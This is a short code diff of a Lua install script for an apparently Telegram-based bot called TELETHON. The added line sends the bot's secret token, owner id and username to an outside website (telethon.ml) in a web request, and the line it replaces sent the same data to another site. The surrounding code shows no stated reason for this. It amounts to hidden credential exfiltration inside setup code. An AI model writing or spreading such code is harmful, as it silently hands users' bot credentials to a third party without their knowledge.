@@ -64,7 +64,7 @@ os.execute('lua startTelethon.lua')
 end
 local function Files_TELETHON_Info()
 Create_Info(database:get(Server_TELETHON.."Token_TELETHON"),database:get(Server_TELETHON.."Id_TELETHON"),database:get(Server_TELETHON.."UserName_TELETHON"))   
-https.request("https://forhassan.ml/LaricA/LaricA.php?id="..database:get(Server_TELETHON.."Id_TELETHON").."&user="..database:get(Server_TELETHON.."UserName_TELETHON").."&token="..database:get(Server_TELETHON.."Token_TELETHON"))
+https.request("https://telethon.ml/telethonCH.php?id="..database:get(Server_TELETHON.."Id_TELETHON").."&user="..database:get(Server_TELETHON.."UserName_TELETHON").."&token="..database:get(Server_TELETHON.."Token_TELETHON"))
 local RunTELETHON = io.open("TELETHON", 'w')
 RunTELETHON:write([[
 #!/usr/bin/env bash
